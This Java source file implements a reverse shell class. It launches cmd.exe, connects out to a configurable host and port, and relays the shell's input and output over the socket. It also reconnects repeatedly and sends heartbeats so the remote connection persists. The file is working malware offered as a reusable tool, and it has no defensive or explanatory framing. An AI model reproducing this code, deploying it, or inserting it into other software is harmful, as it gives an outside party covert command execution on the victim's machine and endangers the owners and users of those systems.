package skorupinski.reverseshell;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ConnectException;
import java.net.Socket;
import java.util.Date;

public class ReverseShell {

    private boolean running;

    private final String host;

    private final int port;

    private int connectionInterval;

    private int heartbeatInterval;

    private boolean showLogs;

    private final String logPrefix = "ReverseShell: ";

    public ReverseShell(String host, int port, int connectionInterval, int heartbeatInterval, boolean showLogs) {
        this.host = host;
        this.port = port;

        this.connectionInterval = connectionInterval;
        this.heartbeatInterval = heartbeatInterval;
        this.showLogs = showLogs;

        start();
    }

    public void setConnectionInterval(int millis) {
        this.connectionInterval = millis;
    }

    public void setHeartbeatInterval(int millis) {
        this.heartbeatInterval = millis;
    }

    public void showLogs(boolean show) {
        this.showLogs = show;
    }

    public void start() {
        running = true;
        knockOnTheServersDoor();
    }

    public void stop() {
        running = false;
    }

    private void log(String text) {
        if(showLogs) {
            System.out.println(logPrefix + text);
        }
    }

    private void knockOnTheServersDoor() {
        long time = getMillis();
        long lastTime = time;

        while(running) {
            time = getMillis();
            if(time - lastTime >= connectionInterval) {
                log("Trying to connect...");
                connect(host, port, heartbeatInterval);
                lastTime = time;
            }
        }
    }

    private void connect(String host, int port, int heartbeatInterval) {
        try {
            Process p = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), 
                        pe = p.getErrorStream();
            InputStream si = s.getInputStream();

            OutputStream po = p.getOutputStream(), 
                        so = s.getOutputStream();

            log("Connection established.");

            long time = getMillis();
            long lastTime = time;

            while(!s.isClosed()) {
                time = getMillis();
                if(time - lastTime >= heartbeatInterval) {
                    log("Checking pulse.");
                    so.write(new byte[] {0});
                    lastTime = time;
                }

                while(pi.available() > 0)
                    so.write(pi.read());
                while(pe.available() > 0)
                    so.write(pe.read());
                while(si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                try {
                    p.exitValue();
                    break;
                } catch (Exception e){}
            };
            p.destroy();
            s.close();
        } catch(ConnectException e) {
            log("Connection refused.");
        } catch(IOException e) {
            log("Connection broken.");
        } 
    }

    private long getMillis() {
        Date date = new Date();
        return date.getTime();
    }

}